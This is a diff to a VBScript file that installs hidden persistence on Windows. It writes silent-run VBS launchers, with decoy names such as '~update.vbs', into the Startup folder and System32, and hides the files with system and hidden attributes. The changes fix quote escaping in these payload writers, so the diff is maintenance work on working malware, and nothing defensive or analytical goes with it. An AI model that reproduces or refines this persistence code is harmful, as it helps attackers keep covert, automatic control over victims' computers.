@@ -103,7 +103,7 @@ vbs_path = startup_path & "\\~" & Right(Minute(Now()) & Second(Now()), 8) & ".vb
 Set outFile = fso.CreateTextFile(vbs_path, True)
 outFile.WriteLine "On Error Resume Next"
 outFile.WriteLine "Set s = CreateObject(""WScript.Shell"")"
-outFile.WriteLine "s.Run """ & cmd & """, 0"
+outFile.WriteLine "s.Run " & Chr(34) & cmd & Chr(34) & ", 0"
 outFile.Close
 
 ' Also create batch shortcut (backup method)
@@ -311,7 +311,7 @@ payload_path = shell.ExpandEnvironmentStrings("%systemroot%") & "\\System32\\~te
 Set f = fso.CreateTextFile(payload_path, True)
 f.WriteLine "On Error Resume Next"
 f.WriteLine "Set s = CreateObject(""WScript.Shell"")"
-f.WriteLine "s.Run """ & cmd & """, 0"
+f.WriteLine "s.Run " & Chr(34) & cmd & Chr(34) & ", 0"
 f.Close
 
 ' Hide file with attrib +s +h
@@ -388,7 +388,7 @@ Dim startup_vbs
 startup_vbs = startup_path & "\\~update.vbs"
 Set f = fso.CreateTextFile(startup_vbs, True)
 f.WriteLine "On Error Resume Next"
-f.WriteLine "CreateObject(""WScript.Shell"").Run """ & cmd & """, 0"
+f.WriteLine "CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ").Run " & Chr(34) & cmd & Chr(34) & ", 0"
 f.Close
 success_count = success_count + 1
 Err.Clear
